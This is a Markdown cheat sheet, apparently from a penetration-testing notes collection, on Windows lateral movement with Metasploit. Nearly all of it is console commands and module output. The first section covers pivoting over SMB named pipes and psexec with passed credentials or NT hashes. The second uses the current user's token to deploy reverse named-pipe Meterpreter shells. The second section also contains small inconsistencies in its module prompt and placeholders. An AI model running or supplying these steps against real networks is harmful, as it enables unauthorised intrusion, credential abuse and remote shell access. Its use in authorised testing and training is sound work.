---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - metasploit-framework
  - windows
credits:
---
# Metasploit

## 01 - Pass the Credentials

```
meterpreter > pivot add -t pipe -l <compromised_computer_IP> -n <namepipe> -a x64 -p windows

meterpreter > bg

msf > use exploit/windows/smb/psexec

msf exploit(windows/smb/psexec) > set target 1

msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_named_pipe

msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_named_pipe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   PIPEHOST  .                yes       Host of the pipe to connect to
   PIPENAME  msf-pipe         yes       Name of the pipe to listen on


Exploit target:

   Id  Name
   --  ----
   1   PowerShell


msf exploit(windows/smb/psexec) > set pipehost <compromised_computer_IP>

msf exploit(windows/smb/psexec) > set pipename <namepipe>

msf exploit(windows/smb/psexec) > set stageencoder [encoder_module]

msf exploit(windows/smb/psexec) > set stageencodingfallback [true | false]

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set rport <target_PORT>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf exploit(windows/smb/psexec) > set smb::auth [ntlm]

msf exploit(windows/smb/psexec) > set smbdomain <domain>

msf exploit(windows/smb/psexec) > set smbshare <share_name>

msf exploit(windows/smb/psexec) > run
```

## 02 - Current Token Session

Instead of passing the credentials this solely relies on the current user token session

```
meterpreter > pivot add -t pipe -l <compromised_computer_IP> -n <namepipe> -a x64 -p windows

meterpreter > bg

msf > use exploit/windows/local/current_user_psexec

msf exploit(windows/local/current_user_psexec) > set target 1

msf exploit(windows/local/current_user_psexec) > set payload windows/x64/meterpreter/reverse_named_pipe

msf exploit(windows/local/current_user_psexec) > options


Module options (exploit/windows/local/current_user_psexec):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DISPNAME                           no        Service display name (Default: random)
   INTERNAL_ADDRESS                   no        Session's internal address or hostname for the victims to grab the payload from (Default: detected)
   KERBEROS          false            yes       Authenticate via Kerberos, dont resolve hostnames
   NAME                               no        Service name on each target in RHOSTS (Default: random)
   RHOSTS                             no        Target address range or CIDR identifier
   SESSION                            yes       The session to run this module on.
   TECHNIQUE         PSH              yes       Technique to use (Accepted: PSH, SMB)

Payload options (windows/x64/meterpreter/reverse_named_pipe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   PIPEHOST  .                yes       Host of the pipe to connect to
   PIPENAME  msf-pipe         yes       Name of the pipe to listen on

Exploit target:

   Id  Name
   --  ----
   1   PowerShell

msf exploit(windows/smb/psexec) > set pipehost <compromised_computer_IP>

msf exploit(windows/smb/psexec) > set pipename <attacker_PORT>

msf exploit(windows/local/current_user_psexec) > set stageencoder [encoder_module]

msf exploit(windows/local/current_user_psexec) > set stageencodingfallback [true | false]

msf exploit(windows/local/current_user_psexec) > set rhosts <IP>

msf exploit(windows/local/current_user_psexec) > set kerberos [<true | false>]

msf exploit(windows/local/current_user_psexec) > set technique <psh | smb>

msf exploit(windows/local/current_user_psexec) > set dispname <ServiceSVC_name>

msf exploit(windows/local/current_user_psexec) > set session <session_ID>

msf exploit(windows/local/current_user_psexec) > run
```

---
## References

### Peter Gombos

- [Peter Gombos: SMB Named Pipe Pivoting in Meterpreter](https://medium.com/@petergombos/smb-named-pipe-pivoting-in-meterpreter-462580fd41c5)